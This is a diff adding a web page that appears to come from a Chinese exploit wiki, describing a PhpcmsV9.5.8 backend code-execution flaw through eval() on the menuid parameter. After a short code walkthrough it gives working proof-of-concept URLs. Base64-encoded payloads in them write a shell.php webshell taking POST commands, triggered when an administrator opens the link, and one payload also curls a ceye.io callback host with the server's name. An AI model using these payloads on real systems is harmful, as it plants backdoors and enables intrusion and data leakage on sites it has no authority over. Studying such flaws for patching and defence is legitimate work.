+<span class="w">         </span><span class="n">$floder_status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="n">$folder</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="err">&#39;</span><span class="w"> </span><span class="k">class</span><span class="o">=</span><span class="s">&quot;&#39;.$folder.&#39;&quot;</span><span class="err">&#39;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">;</span><span class="w">     </span>
+<span class="w">         </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">str</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="n">$recursion</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="err">&#39;</span><span class="o">&lt;</span><span class="n">ul</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="err">&#39;</span><span class="p">.</span><span class="n">$floder_status</span><span class="p">.</span><span class="err">&#39;</span><span class="w"> </span><span class="kt">id</span><span class="o">=</span><span class="err">\&#39;&#39;</span><span class="p">.</span><span class="n">$id</span><span class="p">.</span><span class="err">&#39;\</span><span class="sc">&#39;&gt;&#39;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="err">&#39;</span><span class="o">&lt;</span><span class="n">li</span><span class="err">&#39;</span><span class="p">.</span><span class="n">$floder_status</span><span class="p">.</span><span class="err">&#39;</span><span class="w"> </span><span class="kt">id</span><span class="o">=</span><span class="err">\&#39;&#39;</span><span class="p">.</span><span class="n">$id</span><span class="p">.</span><span class="err">&#39;\</span><span class="sc">&#39;&gt;&#39;</span><span class="p">;</span>
+<span class="w">         </span><span class="n">$recursion</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">FALSE</span><span class="p">;</span>
+<span class="w">         </span><span class="k">if</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">get_child</span><span class="p">(</span><span class="n">$id</span><span class="p">)){</span>
+<span class="w">             </span><span class="n">eval</span><span class="p">(</span><span class="s">&quot;\$nstr = </span><span class="se">\&quot;</span><span class="s">$str2</span><span class="se">\&quot;</span><span class="s">;&quot;</span><span class="p">);</span>
+<span class="w">             </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">str</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="n">$nstr</span><span class="p">;</span>
+<span class="w">             </span><span class="k">if</span><span class="p">(</span><span class="n">$showlevel</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">$showlevel</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">$showlevel</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">$currentlevel</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                 </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">get_treeview</span><span class="p">(</span><span class="n">$id</span><span class="p">,</span><span class="w"> </span><span class="n">$effected_id</span><span class="p">,</span><span class="w"> </span><span class="n">$str</span><span class="p">,</span><span class="w"> </span><span class="n">$str2</span><span class="p">,</span><span class="w"> </span><span class="n">$showlevel</span><span class="p">,</span><span class="w"> </span><span class="n">$style</span><span class="p">,</span><span class="w"> </span><span class="n">$currentlevel</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="nb">TRUE</span><span class="p">);</span>
+<span class="w">             </span><span class="p">}</span><span class="w"> </span><span class="n">elseif</span><span class="p">(</span><span class="n">$showlevel</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">$showlevel</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">$currentlevel</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                 </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">str</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="n">$placeholder</span><span class="p">;</span>
+<span class="w">             </span><span class="p">}</span>
+<span class="w">         </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="n">eval</span><span class="p">(</span><span class="s">&quot;\$nstr = </span><span class="se">\&quot;</span><span class="s">$str</span><span class="se">\&quot;</span><span class="s">;&quot;</span><span class="p">);</span>
+<span class="w">             </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">str</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="n">$nstr</span><span class="p">;</span>
+<span class="w">         </span><span class="p">}</span>
+<span class="w">         </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">str</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="n">$recursion</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="err">&#39;</span><span class="o">&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">ul</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="o">:</span><span class="w"> </span><span class="err">&#39;</span><span class="o">&lt;/</span><span class="n">li</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">     </span><span class="p">}</span>
+<span class="w">     </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">$recursion</span><span class="p">)</span><span class="w">  </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">str</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="err">&#39;</span><span class="o">&lt;/</span><span class="n">ul</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">     </span><span class="k">return</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">str</span><span class="p">;</span>
+<span class="w"> </span><span class="p">}</span>
+</code></pre></div>
+
+<p>复制 文本</p>
+<p>这里有个判断：</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">if</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get_child</span><span class="p">(</span><span class="err">$</span><span class="n">id</span><span class="p">))</span>
+</code></pre></div>
+
+<p><img alt="3.png" src="../resource/PhpcmsV9.5.8%E5%90%8E%E5%8F%B0getshell/media/rId27.png" /></p>
+<p>当第一次执行为ture的时候，还是会再次执行<code>get_treeview</code>的内容</p>
+<div class="codehilite"><pre><span></span><code><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get_treeview</span><span class="p">(</span><span class="err">$</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">effected_id</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">str2</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">showlevel</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">style</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">currentlevel</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="kr">TRUE</span><span class="p">);</span>
+</code></pre></div>
+
+<p>第二次执行的时候<code>$myid</code>由0变成了1，</p>
+<p>这时候的<code>$newarr</code>为空，</p>
+<p>if就不执行，转而执行elseif和else，而<code>$str</code>包含着<code>menuid</code>的值，也就是<code>${@phpinfo()}</code>
+，这时候<code>eval()</code> 就执行了php代码。</p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p><strong>常规poc：</strong><code>https://www.0-sec.org/index.php?m=content&amp;c=content&amp;a=public_categorys&amp;menuid=${@phpinfo()}</code></p>
+<p><strong>进阶版poc：</strong><code>https://www.0-sec.org/index.php?m=content&amp;c=content&amp;a=public_categorys&amp;menuid=${@(assert(base64_decode(ZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycpOw)))}</code></p>
+<blockquote>
+<p>密码1，这要管理员权限才能代码执行，修改下payload，管理员一访问就在当前域名的首页路径下生成shell。</p>
+</blockquote>
+<p><code>print_r(base64_encode("fputs(fopen('shell.php','w'),'&lt;?php eval(\$_POST[2]);');system('curl '.\$_SERVER[\"SERVER_NAME\"].'www.0-sec.org');"));</code></p>
+<blockquote>
+<p>还有另一种payload，会回显的提醒。自动curl请求你的域名，然后回显网站url</p>
+<p>先输出base64的地址，然后在替换下面的字符串&gt; <code>https://www.0-sec.org/index.php?m=content&amp;c=content&amp;a=public_categorys&amp;menuid=(${@(assert(eval(base64_decode(ZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbMl0pOycpO3N5c3RlbSgnY3VybCAnLiRfU0VSVkVSWyJTRVJWRVJfTkFNRSJdLic0MzIxLm5yY3VmOS5jZXllLmlvJyk7))))})</code></p>
+</blockquote>
+<p>这个字符串有几个点提醒下自己，<code>assert()</code>函数执行执行一句php代码，所以在assert前面加个eval，执行多条语句。</p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.mrwu.red/web/2723.html">https://www.mrwu.red/web/2723.html</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20V9.6.0%20authkey%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20V9.6.0%20authkey%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Phpcms V9.6.0 authkey泄露导致注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../PhpYun/Phpyun%20v5.0.1%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../PhpYun/Phpyun%20v5.0.1%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Phpyun v5.0.1 后台getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
